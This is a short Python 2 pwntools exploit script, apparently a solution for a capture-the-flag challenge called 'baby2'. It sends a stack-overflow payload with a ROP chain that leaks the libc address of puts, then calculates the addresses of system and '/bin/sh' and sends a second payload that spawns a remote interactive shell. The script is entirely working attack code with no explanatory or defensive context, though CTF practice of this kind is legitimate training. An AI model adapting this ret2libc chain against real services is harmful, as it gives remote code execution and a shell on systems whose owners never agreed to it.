from pwn import *

p=remote('baby-01.pwn.beer',10002)
#p=process('./baby2')
e=ELF("./baby2")

puts = e.plt['puts']
puts_got = e.got['puts']
main = 0x400698
poprdi = 0x0000000000400783
ret = 0x0000000000400536

payload = "A"*0x10 + "B"*0x8
payload += p64(poprdi) + p64(puts_got) + p64(puts) + p64(main)
p.sendlineafter("input: ",payload)

lb = u64(p.recvline()[:-1]+'\x00'*2) - 0x809c0
system = lb + 0x4f440
binsh = lb + 0x1b3e9a

print hex(lb)
print hex(system)
print hex(binsh)

payload = "A"*0x10 + "B"*0x8
payload += p64(ret)+p64(poprdi) + p64(binsh) + p64(system)
p.sendlineafter("input:",payload)

p.interactive()
